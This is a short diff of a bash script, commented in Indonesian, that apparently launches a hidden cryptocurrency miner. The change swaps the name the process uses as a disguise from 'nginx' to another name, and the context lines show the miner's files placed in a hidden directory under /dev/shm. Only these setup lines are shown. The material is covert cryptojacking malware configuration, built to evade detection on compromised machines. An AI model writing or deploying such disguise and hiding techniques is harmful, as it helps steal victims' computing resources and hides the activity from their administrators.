@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Nama proses penyamaran
-PROC_NAME="nginx"
+PROC_NAME="tobrut"
 
 # Folder tersembunyi
 MINER_DIR="/dev/shm/.cache"
